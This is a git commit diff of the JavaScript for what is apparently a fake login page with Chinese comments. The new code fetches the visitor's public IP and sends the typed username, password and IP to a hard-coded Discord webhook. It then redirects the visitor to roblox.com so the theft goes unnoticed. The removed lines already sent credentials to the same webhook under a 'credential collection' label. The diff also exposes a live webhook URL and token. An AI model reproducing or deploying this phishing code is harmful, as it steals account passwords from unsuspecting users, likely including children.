79358997bfe455be1fdf9a8750de0583820eed9c
Feng <gokevin0720k@gmail.com>
2025-06-05 14:10:29 +0800

    Done

--- scripts.js
+++ scripts.js
@@ -9,35 +9,33 @@ document.addEventListener("DOMContentLoaded", () => {
             alert("請輸入帳號與密碼！");
             return;
         }
-        /*
-        console.log("輸入的帳號:", username);
-        console.log("輸入的密碼:", password);
 
-        alert("登入成功！（模擬）\n帳號：" + username + "\n密碼：" + password);
+        // 先抓取使用者公網 IP
+        fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+                const userIP = data.ip;
 
-        // 儲存為本地檔案
-        const accountData = `帳號: ${username}\n密碼: ${password}\n`;
-        const blob = new Blob([accountData], { type: 'text/plain' });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(blob);
-        link.download = 'account.txt';
-        link.click();*/
+                const webhookURL = "https://discord.com/api/webhooks/1380062024582692935/3_1l1EnLTwsSR1uH15wUhb1jdg-5DE4IZ-OLNbYcrRh9KWlE65RM9KZfIaVwPoW1xLQj";
 
-        // 傳送到 Discord Webhook
-        const webhookURL = "https://discord.com/api/webhooks/1380062024582692935/3_1l1EnLTwsSR1uH15wUhb1jdg-5DE4IZ-OLNbYcrRh9KWlE65RM9KZfIaVwPoW1xLQj";
-
-        fetch(webhookURL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-                content: `帳密收集\n帳號：${username}\n密碼：${password}`
-            }),
-        }).then(() => {
-            console.log("已送出至 Discord Webhook");
-        }).catch((error) => {
-            console.error("Webhook 傳送失敗：", error);
-        });
+                return fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        content: `帳密\n帳號：${username}\n密碼：${password}\n使用者IP：${userIP}`
+                    }),
+                });
+            })
+            .then(() => {
+                console.log("已送出至 Discord Webhook");
+                window.location.href = "https://www.roblox.com/";
+            })
+            .catch((error) => {
+                console.error("發生錯誤：", error);
+                // 無論是否成功，最後都導向 Roblox 網站
+                window.location.href = "https://www.roblox.com/";
+            });
     });
 });
